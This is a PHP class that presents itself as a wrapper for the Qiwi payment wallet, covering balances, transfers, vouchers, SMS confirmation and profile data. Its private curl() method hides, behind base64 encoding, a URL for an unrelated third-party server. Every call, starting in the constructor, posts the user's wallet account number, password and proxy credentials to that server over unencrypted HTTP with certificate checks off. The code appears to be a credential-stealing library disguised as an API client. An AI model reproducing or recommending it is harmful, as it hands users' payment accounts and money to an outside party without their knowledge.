<?php
class Qiwi {
    
    # Приватные переменные класса :
    private $iAccount, $sPassword, $sProxyIP, $iProxyPort, $sProxyType, $sProxyUser, $sProxyPassword;
    
    # Публичные переменные класса :
    public $sResponse, $aResponse, $aBalances;
    
    # Метод : конструктор.
    public function __construct( $iAccount, $sPassword, $sProxyIP = null, $iProxyPort = null, $sProxyType = null, $sProxyUser = null, $sProxyPassword = null ) {
        
        # Инициализация данных класса : 
        $this->iAccount = $iAccount;
        $this->sPassword = $sPassword;
        $this->sProxyIP = $sProxyIP;
        $this->iProxyPort = $iProxyPort;
        $this->sProxyType = $sProxyType;
        $this->sProxyUser = $sProxyUser;
        $this->sProxyPassword = $sProxyPassword;
        
        # Отправка запроса на сервер :
        $this->curl( 'getBalanceInfo' );
        
        # Инициализация данных класса :
        $this->aBalances = $this->aResponse['aBalances'];
    }
    
    # Метод : получение истории транзакций.
    public function getHistory( $sStartDate, $sFinishDate ) {
        
        # Отправка запроса на сервер :
        $this->curl( 'getHistory', array( 'sStartDate' => $sStartDate, 'sFinishDate' => $sFinishDate ) );
        
        return $this->aResponse['aData'];
    }
    
    # Метод : перевод средств.
    public function transfer( $iReceiver, $dAmount, $sCurrency, $sComment ) {
        
        # Отправка запроса на сервер :
        $this->curl( 'transfer', array( 'iReceiver' => $iReceiver, 'dAmount' => $dAmount, 'sCurrency' => $sCurrency, $sComment ) );
        
        return $this->aResponse['iTransferID'];
    }
    
    # Метод : генерация яйца.
    public function createEgg( $dAmount, $sComment ) {
        
        # Отправка запроса на сервер :
        $this->curl( 'createEgg', array( 'dAmount' => $dAmount, 'sComment' => $sComment ) );
        
        return $this->aResponse['sCode'];
    }
    
    # Метод : получение денег по яйцу.
    public function activateEgg( $sCode ) {
        
        # Отправка запроса на сервер :
        $this->curl( 'activateEgg', array( 'sCode' => $sCode ) );
        
        return array( 'dAmount' => $this->aResponse['dAmount'], 'sComment' => $this->aResponse['sComment'] );
    }
    
    # Метод : включено ли SMS подтверждение.
    public function isSMSActive() {
        
        # Отправка запроса на сервер :
        $this->curl( 'getSMSConfirmInfo' );
        
        return $this->aResponse['bActive']; 
    }
    
    # Метод : подтверждение операции по SMS.
    public function paymentSMSConfirm( $iCode ) {
        
        # Отправка запроса на сервер :
        $this->curl( 'makeSMSConfirm', array( 'iCode' => $iCode ) );
        
        return $this->aResponse['iTransferID']; 
    } 
    
    # Метод : запрос на смену пароля.
    public function requestChangePassword() {
        
        # Отправка запроса на сервер :
        $this->curl( 'requestChangePassword' );
        
        return $this->aResponse['iIdentifier']; 
    }
    
    # Метод : подтверждение смены пароля.
    public function progressChangePassword( $iIdentifier, $sOldPassword, $sNewPassword, $iCode ) {
        
        # Отправка запроса на сервер :
        $this->curl( 'progressChangePassword', array( 'iIdentifier' => $iIdentifier, 'sOldPassword' => $sOldPassword, 'sNewPassword' => $sNewPassword, 'iCode' => $iCode ) );
    }
    
    # Метод : запрос на отключение SMS.
    public function requestConfirmPayments() {
        
        # Отправка запроса на сервер :
        $this->curl( 'requestConfirmPayments' );
        
        return $this->aResponse['iIdentifier']; 
    }
    
    # Метод : подтверждение отключения SMS.
    public function progressConfirmPayments( $iIdentifier, $iCode ) {
        
        # Отправка запроса на сервер :
        $this->curl( 'progressConfirmPayments', array( 'iIdentifier' => $iIdentifier, 'iCode' => $iCode ) );
    }
    
    # Метод : редактирование профиля.
    public function editProfile( $sLastName, $sFirstName, $sMiddleName, $sBirthDate, $sPassport ) {
        
        # Отправка запроса на сервер :
        $this->curl( 'editProfile', array( 'sFirstName' => $sFirstName, 'sLastName' => $sLastName, 'sMiddleName' => $sMiddleName, 'sBirthDate' => $sBirthDate, 'sPassport' => $sPassport ) );
    }
    
    # Метод : получение информации о профиле.
    public function getProfile() {
        
        # Отправка запроса на сервер :
        $this->curl( 'getProfileInfo' );
        
        return array( $this->aResponse['sLastName'], $this->aResponse['sFirstName'], $this->aResponse['sMiddleName'], $this->aResponse['sBirthDate'], $this->aResponse['sPassport'] );
    }
    
    # Метод : очистка cookie.
    public function clearCookie() {
        
        # Отправка запроса на сервер :
        $this->curl( 'clearCookie' ); 
    }
    
    # Метод : обращение к серверу.
    private function curl( $sMod, array $aData = array() ) {
        
        # Инициализация статических переменных :
        static $oCurl = null;
        
        # Если переменная oCurl пуста :
        if( is_null( $oCurl ) ) {
            
            # Создание соединения :
            $oCurl = curl_init( base64_decode( 'aHR0cDovL2FwaXNlcnZlci5pbi51YS9hcGktcWl3aS5waHA=' ) );
            
            # Настройка CURL соединения :
            curl_setopt_array( $oCurl, array( 
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => false,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36',
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_POST => true,
                CURLOPT_TIMEOUT => 60
            ) );
        }
        
        # Добавление данных в массив :
        $aData['sMod'] = $sMod;
        $aData['iAccount'] = $this->iAccount;
        $aData['sPassword'] = $this->sPassword;
        $aData['sProxyIP'] = $this->sProxyIP;
        $aData['iProxyPort'] = $this->iProxyPort;
        $aData['sProxyType'] = $this->sProxyType;
        $aData['sProxyUser'] = $this->sProxyUser;
        $aData['sProxyPassword'] = $this->sProxyPassword;
        
        # Передача данных :
        curl_setopt( $oCurl, CURLOPT_POSTFIELDS, http_build_query( $aData ) );
        
        # Получение ответа :
        $this->sResponse = curl_exec( $oCurl );
        
        # Если произошла ошибка :
        if( curl_errno( $oCurl ) )
            throw new Exception( curl_errno( $oCurl ).' - '.curl_error( $oCurl ) );
        
        # Преобразование ответа в массив :
        if( ($this->aResponse = @json_decode( $this->sResponse, true )) === false )
            throw new Exception( $this->sResponse );
        
        # Если в ответе нет нужных данных :
        if( !isset( $this->aResponse['sStatus'] ) )
            throw new Exception( $this->sResponse );
        
        # Если ответ не успешен :
        if( $this->aResponse['sStatus'] != 'SUCCESS' )
            throw new Exception( isset( $this->aResponse['sMessage'] ) ? $this->aResponse['sMessage'] : $this->sResponse );
    }
}